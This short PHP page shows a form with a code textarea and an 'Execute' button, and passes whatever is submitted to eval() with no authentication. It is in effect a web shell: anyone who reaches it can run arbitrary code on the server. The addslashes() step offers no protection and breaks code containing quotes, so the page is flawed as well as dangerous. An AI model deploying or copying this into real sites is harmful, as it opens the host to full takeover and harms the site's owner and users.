<form method="post" action="" stlye="font-family:courier">
<textarea rows="20" cols="80" name="code" spellcheck="false">Type your code here...</textarea>
<br/>
<input type="submit" name="submit" value="Execute" />
</form>

<pre>
<?php

if(isset($_POST['submit'])) {
	$code = addslashes($_POST['code']);
	eval($code);
}

?>
</pre>
